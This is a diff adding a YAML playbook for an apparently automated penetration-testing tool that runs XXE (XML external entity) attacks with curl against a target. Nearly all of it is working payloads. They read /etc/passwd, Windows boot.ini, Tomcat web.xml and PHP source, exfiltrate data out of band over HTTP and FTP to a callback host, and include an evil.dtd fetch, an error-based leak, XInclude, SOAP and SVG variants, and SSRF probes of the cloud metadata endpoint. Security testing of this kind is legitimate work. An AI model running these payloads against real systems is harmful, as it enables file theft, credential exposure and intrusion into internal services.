@@ -1,0 +1,220 @@
+name: "XXE (XML External Entity) Injection"
+description: "XXE detection and exploitation: in-band, blind OOB, error-based, DTD retrieval, parameter entities, and DOCTYPE manipulation"
+version: "1.0"
+
+vars:
+  callback: ""
+
+preflight:
+  - id: setup
+    type: log
+    message: "XXE assessment on {target} (case: {case_id})"
+
+steps:
+  # ---- Phase 1: Technology detection ----
+  - id: tech_detect
+    name: "XML parser technology detection"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: whatweb
+        name: "Technology fingerprint"
+        tool: whatweb
+        args: ["-a3", "{target}", "--log-verbose", "{case_dir}/whatweb-xxe.txt"]
+        timeout: 60
+        artifacts: ["{case_dir}/whatweb-xxe.txt"]
+
+      - id: content_types
+        name: "Check accepted Content-Type (XML/SOAP)"
+        tool: curl
+        args: ["-sI", "{target}",
+               "-D", "{case_dir}/xxe_headers.txt"]
+        timeout: 30
+
+  # ---- Phase 2: In-band XXE (file read) ----
+  - id: inband_xxe
+    name: "In-band XXE — file disclosure"
+    type: parallel
+    max_workers: 5
+    steps:
+      - id: xxe_etc_passwd
+        name: "Read /etc/passwd"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/xml",
+               "-d", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+               "{target}",
+               "-o", "{case_dir}/xxe_etc_passwd.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/xxe_etc_passwd.txt"]
+
+      - id: xxe_windows
+        name: "Read Windows boot.ini"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/xml",
+               "-d", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]><root>&xxe;</root>',
+               "{target}",
+               "-o", "{case_dir}/xxe_windows_boot.txt"]
+        timeout: 30
+
+      - id: xxe_webxml
+        name: "Read web.xml"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/xml",
+               "-d", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/tomcat/web.xml">]><root>&xxe;</root>',
+               "{target}",
+               "-o", "{case_dir}/xxe_webxml.txt"]
+        timeout: 30
+
+      - id: xxe_php_src
+        name: "PHP source via php://filter"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/xml",
+               "-d", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
+               "{target}",
+               "-o", "{case_dir}/xxe_php_src.txt"]
+        timeout: 30
+
+  # ---- Phase 3: Blind XXE (OOB) ----
+  - id: blind_xxe
+    name: "Blind XXE — out-of-band exfiltration"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: xxe_oob_http
+        name: "OOB HTTP exfiltration"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/xml",
+               "-d", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{callback}/xxe-oob">%xxe;]><root>test</root>',
+               "{target}",
+               "-o", "{case_dir}/xxe_oob_http.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/xxe_oob_http.txt"]
+
+      - id: xxe_oob_ftp
+        name: "OOB FTP exfiltration"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/xml",
+               "-d", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "ftp://{callback}/xxe-oob">%xxe;]><root>test</root>',
+               "{target}",
+               "-o", "{case_dir}/xxe_oob_ftp.txt"]
+        timeout: 30
+
+      - id: xxe_dtd_retrieval
+        name: "External DTD retrieval"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/xml",
+               "-d", '<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://{callback}/evil.dtd"><root>test</root>',
+               "{target}",
+               "-o", "{case_dir}/xxe_dtd_fetch.txt"]
+        timeout: 30
+
+  # ---- Phase 4: Error-based XXE ----
+  - id: error_xxe
+    name: "Error-based XXE disclosure"
+    type: parallel
+    max_workers: 2
+    steps:
+      - id: xxe_error_local
+        name: "Error-based with local DTD"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/xml",
+               "-d", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]><root>test</root>',
+               "{target}",
+               "-o", "{case_dir}/xxe_error_based.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/xxe_error_based.txt"]
+
+  # ---- Phase 5: Parameter entity & DOCTYPE variants ----
+  - id: param_entity
+    name: "Parameter entity and DOCTYPE manipulation"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: xxe_parameter
+        name: "Parameter entity XXE"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/xml",
+               "-d", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % param1 "INJECTED">%param1;]><root>test</root>',
+               "{target}",
+               "-o", "{case_dir}/xxe_parameter_entity.txt"]
+        timeout: 30
+
+      - id: xxe_xinclude
+        name: "XInclude attack"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/xml",
+               "-d", '<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>',
+               "{target}",
+               "-o", "{case_dir}/xxe_xinclude.txt"]
+        timeout: 30
+
+      - id: xxe_soap
+        name: "SOAP XXE"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: text/xml",
+               "-d", '<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
+               "{target}",
+               "-o", "{case_dir}/xxe_soap.txt"]
+        timeout: 30
+
+      - id: xxe_svg
+        name: "SVG upload XXE"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: image/svg+xml",
+               "-d", '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="10" y="20">&xxe;</text></svg>',
+               "{target}",
+               "-o", "{case_dir}/xxe_svg.txt"]
+        timeout: 30
+
+  # ---- Phase 6: SSRF via XXE ----
+  - id: xxe_ssrf
+    name: "XXE-driven SSRF probes"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: xxe_ssrf_internal
+        name: "Internal service discovery via XXE"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/xml",
+               "-d", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
+               "{target}",
+               "-o", "{case_dir}/xxe_ssrf_metadata.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/xxe_ssrf_metadata.txt"]
+
+      - id: xxe_ssrf_port
+        name: "Port scan via XXE"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/xml",
+               "-d", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080">]><root>&xxe;</root>',
+               "{target}",
+               "-o", "{case_dir}/xxe_ssrf_port.txt"]
+        timeout: 30
+
+  # ---- Phase 7: Report ----
+  - id: report
+    name: "XXE assessment note"
+    type: log
+    message: |
+      XXE assessment complete for {target}.
+      Results in {case_dir}/:
+      - In-band: xxe_etc_passwd.txt, xxe_windows_boot.txt, xxe_webxml.txt, xxe_php_src.txt
+      - Blind OOB: xxe_oob_http.txt, xxe_oob_ftp.txt, xxe_dtd_fetch.txt
+      - Error-based: xxe_error_based.txt
+      - Variants: xxe_parameter_entity.txt, xxe_xinclude.txt, xxe_soap.txt, xxe_svg.txt
+      - SSRF via XXE: xxe_ssrf_metadata.txt, xxe_ssrf_port.txt
+      Monitor {callback} for OOB callbacks.
